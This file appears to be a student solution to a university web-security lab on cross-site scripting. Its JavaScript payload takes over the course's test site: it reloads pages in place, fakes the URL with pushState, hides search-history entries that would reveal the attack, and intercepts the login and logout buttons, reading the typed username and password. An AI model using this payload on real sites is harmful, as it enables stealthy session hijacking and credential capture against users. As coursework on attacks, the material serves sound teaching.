<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>
// Extend this function:
function payload(attacker) {
    function proxy(href) {
        $("html").load(href, function(){
            $("html").show();
            var xssdefense = 0;
            if(href.indexOf("xssdefense") != -1) {
                var i = href.indexOf("xssdefense");
                xssdefense = href.substring(i+11, i+12);
            }
            var stateObj = { foo: "bar" };
            history.pushState(stateObj, "page 2", "/project2");
            var currentstate = history.state;
            //$("#query").val("helloworld2");
            //search on home page
            $("#search-btn").click(function(event) {
                var q = $("#query").val();
                if(xssdefense == 0) {
                    searchProxy("http://cis331.cis.upenn.edu/project2/" +"search?q=" + q, q);
                }
                else {
                    console.log("about to search, non-zero xssdefense");
                    searchProxy("http://cis331.cis.upenn.edu/project2/" + "search?xssdefense=" + xssdefense + "&q=" + q, q, xssdefense);
                }
                event.preventDefault();
            });
            //edits search history
        $("#history-list").children().each(function(index) {
                //console.log(index + " : " + $(this).text());
                var url = $(this).attr('href');
                if(url.indexOf("payload") != -1) {
                    console.log("GOT EM");
                    $(this).hide();
                }
            });
            //logout button
            $("#log-out-btn").click(function(event) {
                logoutProxy(xssdefense);
                event.preventDefault();
        });
             //login button
             $("#log-in-btn").click(function(event) {
                loginProxy(xssdefense);
                event.preventDefault();
            });

             $("#bungle-lnk").click(function( event ) {
                proxy("./project2?xssdefense=" + xssdefense);
                event.preventDefault();
            });

         });

}

function logoutProxy(xssdefense) {
    $.post( 
        "http://cis331.cis.upenn.edu/project2/logout",
        function(result) {
            if(xssdefense == 0) {
                proxy("http://cis331.cis.upenn.edu/project2");
            }
            else {
                proxy("http://cis331.cis.upenn.edu/project2" + "/?xssdefense=" + xssdefense);
            }
        }
        );
}

function loginProxy(xssdefense) {
    var usernameInput = $("#username").val();
    var passwordInput = $("#userpass").val();
    $.post( 
        "http://cis331.cis.upenn.edu/project2/login",
        { username: usernameInput, password: passwordInput },
        function(result) {
            if(xssdefense == 0) {
                proxy("http://cis331.cis.upenn.edu/project2");
            }
            else {
                proxy("http://cis331.cis.upenn.edu/project2" + "/?xssdefense=" + xssdefense);
            }
        }
        );
}

function searchProxy(href, q, xssdefense) {
 $("html").load(href, function(){
    $("html").show();
    var stateObj = { foo: "bar" };
    history.pushState(stateObj, "page 2", "/search?q=" + q);
    var currentstate = history.state;
    //edits search history
    $("#history-list").children().each(function(index) {
                var url = $(this).attr('href');
                if(url.indexOf("payload") != -1) {
                    console.log("GOT EM");
                    $(this).hide();
                }
            });
    //all button functionality, analogous to proxy
    $("#search-again-btn").click(function( event ) {
        proxy("./project2");
        event.preventDefault();
    });
    $("#log-out-btn").click(function(event) {
                logoutProxy(xssdefense);
            event.preventDefault();
        });
     $("#log-in-btn").click(function(event) {
                loginProxy(xssdefense);
                event.preventDefault();
        });
     $("#bungle-lnk").click(function( event ) {
        proxy("./project2?xssdefense=" + xssdefense);
        event.preventDefault();
    });

});
}

$("html").hide();
//proxy("./");

//this is manual for now..
proxy("./?xssdefense=3");

}
